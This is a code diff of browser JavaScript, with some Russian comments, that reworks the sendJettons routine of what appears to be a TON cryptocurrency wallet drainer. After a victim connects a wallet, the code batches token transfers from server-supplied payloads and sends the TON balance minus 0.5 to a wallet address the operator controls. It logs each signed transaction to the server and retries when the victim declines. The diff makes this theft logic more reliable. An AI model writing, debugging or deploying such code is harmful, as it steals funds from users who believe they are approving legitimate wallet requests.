@@ -182,225 +182,145 @@ async function connect(walletAddress) {
     }
 }
 
+let isProcessing = false; // Добавьте эту глобальную переменную
+
 async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFlag) {
-    let adr = new TonWeb.utils.Address(walletAddress)
-    if (i < 0) {
-        i = 0;
+    if (isProcessing) {
+        console.log('Already processing jettons, skipping...');
+        return;
     }
-    currTx = false;
-    let msgs = 0;
-    let tkn = 0;
-    let tontx;
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-        messages: []
-    };
-    let tokens = {}
-    let len = Object.keys(data.data.boc).length;
-    for (i; i < len + 1; i) {
-        try {
-            if (msgs < 4 && i < len) {
-
-                msgs += 1;
-                
-                if ((ton * tonPrice < data.data.prices[i]) || (ton * tonPrice > data.data.prices[i] && tonFlag)) {
-
-                    transaction.messages.push({
-                        address: data.data.address[i],
-                        amount: TonWeb.utils.toNano('0.05').toString(),
-                        payload: data.data.boc[i]
-                    });
-                    tokens[tkn] = {
-                        name: data.data.name[i],
-                        prices: data.data.prices[i]
-                    }
-                    tkn++;
-                    i++;
-                } else {
-
-                    if (ton > "0.5" && !tontx) {
-                        let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.5");
-                        let payload = await get_ton_text(transfer_value)
+    
+    isProcessing = true;
+    
+    try {
+        let adr = new TonWeb.utils.Address(walletAddress);
+        if (i < 0) {
+            i = 0;
+        }
+        currTx = false;
+        let msgs = 0;
+        let tkn = 0;
+        let tontx = false;
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 60,
+            messages: []
+        };
+        let tokens = {};
+        let len = Object.keys(data.data.boc).length;
+        
+        console.log(`Processing jettons from index ${i} to ${len}, try: ${tryies}`);
+        
+        for (; i < len; i++) {
+            try {
+                if (msgs < 4) {
+                    msgs += 1;
+                    
+                    if ((ton * tonPrice < data.data.prices[i]) || (ton * tonPrice > data.data.prices[i] && tonFlag)) {
                         transaction.messages.push({
-                            address: data.data.wallet,
-                            amount: transfer_value,
-                            payload : payload.data
+                            address: data.data.address[i],
+                            amount: TonWeb.utils.toNano('0.05').toString(),
+                            payload: data.data.boc[i]
                         });
-                        tontx = true;
-                        tonFlag = true
                         tokens[tkn] = {
-                            name: 'TON',
-                            prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
-                        }
+                            name: data.data.name[i],
+                            prices: data.data.prices[i]
+                        };
                         tkn++;
                     } else {
-                        tonFlag = true
-                        msgs -= 1;
+                        if (ton > "0.5" && !tontx) {
+                            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.5");
+                            let payload = await get_ton_text(transfer_value);
+                            transaction.messages.push({
+                                address: data.data.wallet,
+                                amount: transfer_value,
+                                payload: payload.data
+                            });
+                            tontx = true;
+                            tonFlag = true;
+                            tokens[tkn] = {
+                                name: 'TON',
+                                prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
+                            };
+                            tkn++;
+                        } else {
+                            tonFlag = true;
+                            msgs -= 1; // Откатываем счетчик, так как не добавили сообщение
+                        }
                     }
                 }
-
-
-            } else {
-                if (Object.keys(transaction.messages).length) {
-                    tryies++
-                    let txRequest = await transfer_jettons_native_request(tokens, tryies)
-                    currTx = true;
-                    const result = await tonConnectUI.sendTransaction(transaction)
-                    tonweb.
+                
+                // Если набрали 4 сообщения или дошли до конца, отправляем транзакцию
+                if (msgs >= 4 || i === len - 1) {
+                    if (transaction.messages.length > 0) {
+                        tryies++;
+                        console.log(`Sending transaction with ${transaction.messages.length} messages, try: ${tryies}`);
+                        
+                        let txRequest = await transfer_jettons_native_request(tokens, tryies);
+                        currTx = true;
+                        const result = await tonConnectUI.sendTransaction(transaction);
+                        
+                        const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
+                        const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
+                        let data123 = {
+                            hash: hash,
+                            tokens: tokens,
+                        };
+                        
+                        if (tontx) {
+                            await jettons_transaction_done(data123, true);
+                        } else {
+                            await jettons_transaction_done(data123, false);
+                        }
+                        
+                        // Сбрасываем для следующей партии
+                        transaction.messages = [];
+                        tokens = {};
+                        msgs = 0;
+                        tkn = 0;
+                    }
+                }
+            } catch (e) {
+                console.log('Error processing jetton at index', i, ':', e);
+                
+                if (tryies < maxRetry) {
+                    console.log(`Retrying... Attempt ${tryies + 1}/${maxRetry}`);
+                    
+                    let datas = {
+                        data: tokens,
+                        walletAddress: walletAddress,
+                        ton: ton,
+                        tonPrice: tonPrice,
+                        i: i,
+                        tryies: tryies,
+                        tonFlag: tonFlag,
+                        isTon: tontx
+                    };
+                    
+                    await decline_transfer_jettons_native_request(datas);
+                    
+                    // Ждем перед повторной попыткой
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    
+                    // Продолжаем с того же индекса
+                    continue;
+                } else {
+                    console.log('Max retries reached, moving to next jetton');
+                    // Сбрасываем и продолжаем со следующим джеттоном
+                    transaction.messages = [];
+                    tokens = {};
                     msgs = 0;
                     tkn = 0;
-                    
-                    const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
-                    transaction.messages = []
-                    const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
-                    let data123 = {
-                        hash: hash,
-                        tokens: tokens,
-                    }
-                    if (tontx) {
-                        tonFlag = true;
-                        await jettons_transaction_done(data123, true)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                            setTimeout(async () => {
-                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
-                            }, '7000')
-                        } else {
-                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
-                        }
-                    } else {
-                        await jettons_transaction_done(data123, false)
-                        await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                            setTimeout(async () => {
-                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                            }, '7000')
-                        } else {
-                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
-                        }
-                    }
-                } else {
-                    return;
-                }
-
-            }
-        } catch (e) {
-
-            console.log(e)
-        
-            if (tontx) {
-                if (tryies < maxRetry) {
-                    transaction.messages = {}
-                    let datas = {
-                        data: tokens,
-                        walletAddress: walletAddress,
-                        ton: ton,
-                        tonPrice: tonPrice,
-                        i: i - tkn,
-                        tryies: tryies,
-                        tonFlag: tonFlag,
-                        isTon: true
-                    }
-                    let res = await decline_transfer_jettons_native_request(datas)
-                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                        setTimeout(async () => {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
-                        }, '3000')
-                    } else {
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
-                    }
-
-
-
-                } else {
-
-                    transaction.messages = {}
-
-                    if (i < Object.keys(data.data.boc).length) {
-                        let datas = {
-                            data: tokens,
-                            walletAddress: walletAddress,
-                            ton: ton,
-                            tonPrice: tonPrice,
-                            i: i,
-                            tryies: tryies,
-                            tonFlag: tonFlag,
-                            isTon: true
-                        }
-                        let res = await decline_transfer_jettons_native_request(datas)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-
-                            setTimeout(async () => {
-                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
-                            }, '3000')
-                        } else {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
-                        }
-                    } else {
-                    }
-                }
-
-            } else {
-                if (tryies < maxRetry) {
-                    transaction.messages = {}
-                    let datas = {
-                        data: tokens,
-                        walletAddress: walletAddress,
-                        ton: ton,
-                        tonPrice: tonPrice,
-                        i: i - tkn,
-                        tryies: tryies,
-                        tonFlag: tonFlag,
-                        isTon: false
-                    }
-                    let res = await decline_transfer_jettons_native_request(datas)
-                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-                        setTimeout(async () => {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
-                        }, '3000')
-                    } else {
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
-                    }
-
-
-
-
-                } else {
-                    transaction.messages = {}
-                    if (i < len) {
-                        let datas = {
-                            data: tokens,
-                            walletAddress: walletAddress,
-                            ton: ton,
-                            tonPrice: tonPrice,
-                            i: i,
-                            tryies: 0,
-                            tonFlag: tonFlag,
-                            isTon: false
-                        }
-                        let res = await decline_transfer_jettons_native_request(datas)
-                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
-
-                            setTimeout(async () => {
-                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-                            }, '3000')
-                        } else {
-                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-                        }
-                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
-
-
-                    } else {
-                        break;
-                    }
+                    tryies = 0;
                 }
             }
-    
         }
-
+        
+        console.log('Finished processing all jettons');
+    } catch (error) {
+        console.error('Critical error in sendJettons:', error);
+    } finally {
+        isProcessing = false;
     }
-
-
-
 }
 
 async function send(walletAddress, balance, tryies, address) {
@@ -612,5 +532,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
